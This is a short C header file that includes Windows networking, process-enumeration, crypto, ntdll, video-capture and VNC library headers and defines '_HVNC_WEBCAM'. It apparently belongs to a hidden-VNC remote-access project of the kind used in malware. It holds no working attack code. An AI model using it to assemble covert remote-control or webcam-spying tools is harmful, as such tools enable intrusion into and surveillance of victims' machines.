#ifndef INCLUDES_H_INCLUDED
#define INCLUDES_H_INCLUDED

#define _WIN32_WINNT 0x0501
#define WINVER 0x0501
#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <emmintrin.h>
#include <tmmintrin.h>
#include <wininet.h>
#include <wincrypt.h>
#pragma warning(disable:4200)
#include <ntdll.h>
#include <vfw.h>
#include <zlib.h>
#include <rfb\rfb.h>
#include <syslib.h>
#include <minizip.h>

#include "vnc\xvnc.h"
#include "defines.h"

#define _HVNC_WEBCAM

#endif // INCLUDES_H_INCLUDED
